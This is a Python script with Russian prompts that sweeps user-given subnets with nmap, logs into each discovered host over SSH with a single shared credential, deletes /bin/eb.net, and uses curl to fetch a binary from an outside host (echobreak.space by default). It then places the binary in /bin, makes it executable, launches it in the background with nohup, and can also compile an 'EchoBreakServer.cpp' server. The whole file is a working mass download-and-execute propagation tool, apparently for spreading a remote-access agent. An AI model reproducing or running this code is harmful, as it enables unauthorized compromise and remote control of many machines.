import subprocess
import paramiko
from tqdm import tqdm
import time
import os


def getLocalDevices(network_range):
    print(f"[*] Сканируем сеть {network_range}...")
    devices = []

    with tqdm(total=100, desc=f"Сканирование {network_range}", bar_format="{l_bar}{bar} [ осталось: {remaining} ]",
              leave=False) as pbar:
        result = subprocess.run([
            "nmap", "-sn", network_range
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        lines = result.stdout.splitlines()
        for line in lines:
            if "Nmap scan report for" in line:
                ip = line.split()[-1]
                if not ip.startswith("localhost") and not ip.endswith(".1"):
                    devices.append(ip)
            pbar.update(5)
            time.sleep(0.01)

    return devices


def downloadAndRun(ip, username, password, file_url, target_path):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        with tqdm(total=100, desc=f"Подключение к {ip}", leave=False) as pbar:
            ssh.connect(ip, username=username, password=password, timeout=5)
            pbar.update(30)

            stdin, stdout, stderr = ssh.exec_command(f"rm -f /bin/eb.net && curl -o {target_path} {file_url}") #  && curl -o {target_path} {file_url}
            pbar.update(40)
            
            stdout.read(), stderr.read()

            stdin, stdout, stderr = ssh.exec_command(f"chmod +x {target_path} && nohup {target_path} &")
            pbar.update(30)
            
            ssh.close()
        return True
    except Exception as e:
        tqdm.write(f"[!] Не удалось подключиться к {ip}: {e}")
        return False


if __name__ == "__main__":
    SSH_USERNAME = input("Введите имя пользователя: ")
    SSH_PASSWORD = input("Введите пароль для пользователя: ")
    ip_count = int(input("Сколько подсетей вы хотите просканировать? "))

    NETWORK_RANGES = []
    for i in range(ip_count):
        net = input(f"Введите диапазон подсети #{i + 1} (например, 172.17.212.0/24): ")
        NETWORK_RANGES.append(net)

    FILE_URL = input(
        "Введите URL для загрузки файла (или Enter для использования https://echobreak.space/downloads/eb.net): ").strip()
    if not FILE_URL:
        FILE_URL = "https://echobreak.space/downloads/eb.net"

    TARGET_PATH = "/bin/eb.net"

    run_download = input("Выполнить загрузку и запуск файла на устройствах? (y/n): ").lower() == 'y'

    compile_server = input("Хотите скомпилировать сервер EchoBreakServer.cpp? (y/n): ").lower() == 'y'
    if compile_server:
        try:
            print("[*] Компилируем сервер... (метод 1)")
            os.system("g++ source/EchoBreakServer.cpp -pthread -o EBS")
        except:
            print("[*] Компилируем сервер... (метод 2)")
            os.system("c++ -std=c++17 source/EchoBreakServer.cpp -o EBS")

    all_devices = []
    for network in NETWORK_RANGES:
        devices = getLocalDevices(network)
        all_devices.extend(devices)
        print(f"[*] Найдено устройств в {network}: {len(devices)}")

    if run_download:
        success_count = 0
        fail_count = 0

        print(f"[*] Начинаем обработку {len(all_devices)} устройств...")
        for ip in tqdm(all_devices, desc="Обработка устройств", total=len(all_devices)):
            if downloadAndRun(ip, SSH_USERNAME, SSH_PASSWORD, FILE_URL, TARGET_PATH):
                success_count += 1
            else:
                fail_count += 1

        print(f"\n[+] Успешно обработано: {success_count}")
        print(f"[-] Неудач: {fail_count}")

    print("[*] Завершено.")
